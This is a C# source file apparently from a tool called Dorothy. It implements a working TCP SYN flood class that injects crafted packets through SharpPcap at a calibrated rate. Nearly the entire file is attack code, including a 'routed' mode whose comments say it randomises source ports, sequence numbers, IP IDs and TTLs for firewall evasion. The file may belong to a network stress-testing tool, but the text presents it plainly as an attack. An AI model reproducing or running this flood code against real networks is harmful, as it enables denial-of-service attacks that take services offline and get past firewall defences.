using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    /// <summary>
    /// Unified TCP flood attack with routing-aware behavior.
    /// Automatically adapts packet structure based on routing requirements:
    /// - Local subnet: Can use payload, fixed source port
    /// - Routed: No payload, randomized source ports/headers for firewall evasion
    /// </summary>
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;
        public event EventHandler<PacketEventArgs>? PacketSent;

        /// <summary>
        /// Whether this is a routed attack (cross-subnet). 
        /// When true: no payload, randomized source ports/headers for firewall evasion.
        /// When false: can use payload, fixed source port for higher throughput.
        /// </summary>
        public bool IsRouted { get; set; } = false;

        /// <summary>
        /// Whether to include payload in SYN packets. 
        /// Default: false for routed (firewall-friendly), true for local (higher throughput).
        /// </summary>
        public bool AddPayload { get; set; } = false;

        /// <summary>
        /// Whether to randomize source ports and TCP/IP header fields.
        /// Default: true for routed (evasive), false for local (simpler).
        /// </summary>
        public bool RandomizeFlows { get; set; } = false;

        public TcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
            
            // Auto-detect routing mode based on MAC address
            // If destination MAC is gateway MAC (common pattern), assume routed
            // This is a heuristic - explicit setting via properties takes precedence
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => 
                        addr.Addr.ipAddress != null && 
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                // For routed attacks, we might need to use standard SendPacket instead of injection
                // But try injection first as it's more efficient
                IInjectionDevice? injectionDevice = _device as IInjectionDevice;
                bool useInjection = injectionDevice != null;
                
                if (!useInjection && !IsRouted)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }
                
                if (!useInjection && IsRouted)
                {
                    Logger.Info($"Device {_device.Name} does not support injection, using standard SendPacket for routed attack");
                }

                var random = new Random();
                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                // Determine if we should use routed behavior
                // Routed = no payload, randomized flows for firewall evasion
                bool useRoutedBehavior = IsRouted || RandomizeFlows;
                bool usePayload = AddPayload && !useRoutedBehavior; // Don't add payload if routed

                Logger.Info($"TCP Flood mode: Routed={useRoutedBehavior}, Payload={usePayload}, RandomizeFlows={RandomizeFlows}");

                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = _params.Ttl
                };

                // Create TCP packet with appropriate configuration
                var tcpPacket = new TcpPacket(
                    (ushort)(RandomizeFlows ? random.Next(49152, 65536) : _params.SourcePort), 
                    (ushort)_params.DestinationPort)
                {
                    Flags = 0x02,  // SYN flag
                    WindowSize = (ushort)(RandomizeFlows ? random.Next(8192, 65536) : 8192),
                    SequenceNumber = (uint)(RandomizeFlows ? random.Next() : 0)
                };

                // Add payload only if configured and not in routed mode
                if (usePayload)
                {
                    tcpPacket.PayloadData = new byte[1400];
                    random.NextBytes(tcpPacket.PayloadData);
                }

                // Randomize IP header fields if in routed mode
                if (RandomizeFlows)
                {
                    ipPacket.Id = (ushort)random.Next(0, 65536);
                    ipPacket.TimeToLive = (byte)random.Next(64, 128);
                }

                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                // Get header size (no payload) for routed mode calibration
                // Note: ethernetPacket may already have payload if usePayload is true, so we'll calculate from reference packet
                int wireHeaderSize = 0; // Will be set during calibration
                
                // Calibration for routed mode
                double maxPps = 0;
                int payloadLength = 0;
                int actualWireSize = wireHeaderSize;
                long targetBytesPerSecond = _params.BytesPerSecond;
                double userMbps = targetBytesPerSecond * 8.0 / 1_000_000;
                
                if (IsRouted || useRoutedBehavior)
                {
                    Logger.Info("Starting calibration for routed TCP mode...");
                    
                    // Build reference SYN packet (no payload, same MAC/IP/ports)
                    var refTcpPacket = new TcpPacket(
                        (ushort)(RandomizeFlows ? random.Next(49152, 65536) : _params.SourcePort),
                        (ushort)_params.DestinationPort)
                    {
                        Flags = 0x02, // SYN flag
                        WindowSize = (ushort)(RandomizeFlows ? random.Next(8192, 65536) : 8192),
                        SequenceNumber = (uint)(RandomizeFlows ? random.Next() : 0)
                        // No payload
                    };
                    
                    var refIpPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                    {
                        Protocol = PacketDotNet.ProtocolType.Tcp,
                        TimeToLive = (byte)(RandomizeFlows ? random.Next(64, 128) : _params.Ttl)
                    };
                    
                    if (RandomizeFlows)
                    {
                        refIpPacket.Id = (ushort)random.Next(0, 65536);
                    }
                    
                    refIpPacket.PayloadPacket = refTcpPacket;
                    var refEthernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                    refEthernetPacket.PayloadPacket = refIpPacket;
                    
                    refTcpPacket.UpdateCalculatedValues();
                    refIpPacket.UpdateCalculatedValues();
                    
                    byte[] refPacket = refEthernetPacket.Bytes;
                    int refHeaderSize = refPacket.Length;
                    wireHeaderSize = refHeaderSize + 4; // Add FCS for wire size
                    
                    // Calibration: send as fast as possible for 300-500ms
                    var calStopwatch = Stopwatch.StartNew();
                    long calPacketsSent = 0;
                    const int calDurationMs = 400; // 400ms calibration window
                    
                    Logger.Info($"Calibrating max packet rate for {calDurationMs}ms...");
                    
                    while (calStopwatch.ElapsedMilliseconds < calDurationMs && !_cancellationToken.IsCancellationRequested)
                    {
                        if (useInjection)
                        {
                            injectionDevice!.SendPacket(refPacket);
                        }
                        else
                        {
                            _device!.SendPacket(refPacket);
                        }
                        calPacketsSent++;
                    }
                    
                    calStopwatch.Stop();
                    double calElapsedSeconds = calStopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                    maxPps = calPacketsSent / calElapsedSeconds;
                    
                    Logger.Info($"Calibration complete: {calPacketsSent} packets in {calElapsedSeconds:F3}s = {maxPps:F0} packets/second");
                    
                    // Calculate required payload size based on target Mbps and maxPps
                    long requiredWireSize = (long)(targetBytesPerSecond / maxPps);
                    payloadLength = (int)(requiredWireSize - wireHeaderSize);
                    
                    // Clamp payload length between 0 and 1400
                    const int maxPayload = 1400;
                    payloadLength = Math.Max(0, Math.Min(payloadLength, maxPayload));
                    
                    actualWireSize = wireHeaderSize + payloadLength;
                    double effectiveMaxMbps = maxPps * actualWireSize * 8.0 / 1_000_000;
                    
                    if (userMbps > effectiveMaxMbps)
                    {
                        // Clamp to effective maximum
                        effectiveMaxMbps = Math.Max(0.1, effectiveMaxMbps); // Ensure at least 0.1 Mbps
                        targetBytesPerSecond = (long)(effectiveMaxMbps * 1_000_000 / 8.0);
                        Logger.Warn($"Requested {userMbps:F2} Mbps exceeds environment capacity ({effectiveMaxMbps:F2} Mbps). Clamping to {effectiveMaxMbps:F2} Mbps.");
                    }
                    
                    Logger.Info($"Routed TCP configuration: header={refHeaderSize} bytes, payload={payloadLength} bytes, wire={actualWireSize} bytes, maxPps={maxPps:F0}, effective={effectiveMaxMbps:F2} Mbps");
                    
                    // Update TCP packet with calculated payload
                    if (payloadLength > 0)
                    {
                        tcpPacket.PayloadData = new byte[payloadLength];
                        random.NextBytes(tcpPacket.PayloadData);
                        tcpPacket.UpdateCalculatedValues();
                        ipPacket.UpdateCalculatedValues();
                        ethernetPacket.PayloadPacket = ipPacket;
                        actualWireSize = ethernetPacket.Bytes.Length + 4; // Recalculate with payload
                    }
                }

                // Capture variables for Task.Run closure
                int finalWireSize = actualWireSize;
                int finalPayloadLength = payloadLength;
                long finalTargetBytesPerSecond = targetBytesPerSecond;
                bool isRoutedMode = IsRouted || useRoutedBehavior;
                
                // Get actual packet size from the Ethernet frame (includes Ethernet header + IP + TCP + payload)
                int totalPacketSize = ethernetPacket.Bytes.Length;
                int batchSize = 1000; // Increased batch size

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    var bytes = new byte[4];
                    var packetPool = new byte[batchSize][];

                    // Pre-generate packet pool and get actual packet size
                    int actualPacketSize = 0;
                    for (int i = 0; i < batchSize; i++)
                    {
                        // Regenerate randomized fields if needed
                        if (RandomizeFlows)
                        {
                            // Randomize TCP fields
                            tcpPacket.SourcePort = (ushort)random.Next(49152, 65536);
                            tcpPacket.SequenceNumber = (uint)random.Next();
                            tcpPacket.WindowSize = (ushort)random.Next(8192, 65536);
                            
                            // Randomize IP fields
                            ipPacket.Id = (ushort)random.Next(0, 65536);
                            ipPacket.TimeToLive = (byte)random.Next(64, 128);
                        }
                        else
                        {
                            // Just randomize sequence number for variation
                            random.NextBytes(bytes);
                            tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                        }
                        
                        // For routed mode with payload, regenerate payload data
                        if (isRoutedMode && finalPayloadLength > 0 && tcpPacket.PayloadData != null)
                        {
                            random.NextBytes(tcpPacket.PayloadData);
                        }
                        
                        tcpPacket.UpdateCalculatedValues();
                        ipPacket.UpdateCalculatedValues();
                        packetPool[i] = ethernetPacket.Bytes;
                        
                        // Get actual packet size from first packet
                        if (i == 0)
                        {
                            actualPacketSize = ethernetPacket.Bytes.Length;
                            Logger.Info($"TCP packet size: {actualPacketSize} bytes, Target rate: {finalTargetBytesPerSecond * 8.0 / 1_000_000:F2} Mbps");
                        }
                    }

                    // Use actual packet size for rate calculation (Ethernet frame includes all headers + FCS)
                    // For routed mode, use the calibrated finalWireSize
                    int wirePacketSize = isRoutedMode ? finalWireSize : (actualPacketSize + 4);
                    double targetMbps = finalTargetBytesPerSecond * 8.0 / 1_000_000;
                    Logger.Info($"TCP packet wire size: {wirePacketSize} bytes, Target rate: {targetMbps:F2} Mbps");
                    
                    // Byte-budget rate control: track bytes sent vs time elapsed
                    long bytesSent = 0;
                    var currentBatch = 0;
                    
                    // Rate measurement for logging/UI only (not used for timing)
                    var measurementStartTime = stopwatch.ElapsedTicks;
                    long measurementStartBytes = 0;
                    const int measurementWindowMs = 500; // Measure every 500ms
                    double smoothedActualMbps = 0;
                    const double smoothingAlpha = 0.3; // Exponential smoothing factor
                    
                    // Determine if low rate (for Windows-friendly waiting)
                    bool isLowRate = targetMbps < 5.0;
                    int sleepCounter = 0; // For mixing sleep with spin-wait at low rates

                    stopwatch.Start();

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            // Calculate how many bytes we're "allowed" to have sent so far
                            double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                            long allowedBytes = (long)(elapsedSeconds * finalTargetBytesPerSecond);
                            
                            // If we're behind budget, send packets (small burst)
                            if (bytesSent < allowedBytes)
                            {
                                // Calculate how many packets we can send to catch up (but limit burst size)
                                long bytesBehind = allowedBytes - bytesSent;
                                int packetsToSend = Math.Min((int)(bytesBehind / wirePacketSize) + 1, 5); // Max 5 packets per iteration
                                
                                for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                {
                                    var packet = packetPool[currentBatch];
                                    if (useInjection)
                                    {
                                        injectionDevice!.SendPacket(packet);
                                    }
                                    else
                                    {
                                        // Fallback for routed attacks on devices without injection support
                                        _device!.SendPacket(packet);
                                    }
                                    OnPacketSent(packet, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);
                                    
                                    bytesSent += wirePacketSize;
                                    currentBatch++;
                                    
                                    // Regenerate packet pool when needed
                                    if (currentBatch >= batchSize)
                                    {
                                        // Regenerate in smaller chunks to reduce blocking
                                        int regenerateCount = Math.Min(100, batchSize);
                                        for (int j = 0; j < regenerateCount; j++)
                                        {
                                            if (RandomizeFlows)
                                            {
                                                // Randomize all fields for routed/evasive mode
                                                tcpPacket.SourcePort = (ushort)random.Next(49152, 65536);
                                                tcpPacket.SequenceNumber = (uint)random.Next();
                                                tcpPacket.WindowSize = (ushort)random.Next(8192, 65536);
                                                ipPacket.Id = (ushort)random.Next(0, 65536);
                                                ipPacket.TimeToLive = (byte)random.Next(64, 128);
                                            }
                                            else
                                            {
                                                // Just randomize sequence number
                                                random.NextBytes(bytes);
                                                tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                                            }
                                            
                                            // For routed mode with payload, regenerate payload data
                                            if (isRoutedMode && finalPayloadLength > 0 && tcpPacket.PayloadData != null)
                                            {
                                                random.NextBytes(tcpPacket.PayloadData);
                                            }
                                            
                                            tcpPacket.UpdateCalculatedValues();
                                            ipPacket.UpdateCalculatedValues();
                                            packetPool[j] = ethernetPacket.Bytes;
                                        }
                                        currentBatch = 0;
                                    }
                                }
                            }
                            else
                            {
                                // We're at or above budget - wait briefly
                                // Windows-friendly waiting: spin-wait at high rates, mix sleep+spin at low rates
                                if (isLowRate && sleepCounter++ % 10 == 0)
                                {
                                    // At low rates, sleep occasionally to avoid pegging CPU core
                                    Thread.Sleep(0); // Yield to other threads
                                }
                                else
                                {
                                    // Short spin-wait for precision
                                    Thread.SpinWait(10);
                                }
                            }

                            // Rate measurement for logging/UI (time-based window, smoothed)
                            long currentTicks = stopwatch.ElapsedTicks;
                            double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;
                            
                            if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                            {
                                long bytesInWindow = bytesSent - measurementStartBytes;
                                double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);
                                
                                // Exponential smoothing to reduce Windows jitter
                                if (smoothedActualMbps == 0)
                                    smoothedActualMbps = actualMbps;
                                else
                                    smoothedActualMbps = (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);
                                
                                Logger.Info($"TCP rate: actual={smoothedActualMbps:F2} Mbps, target={targetMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");
                                
                                // Reset measurement window
                                measurementStartTime = currentTicks;
                                measurementStartBytes = bytesSent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending TCP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}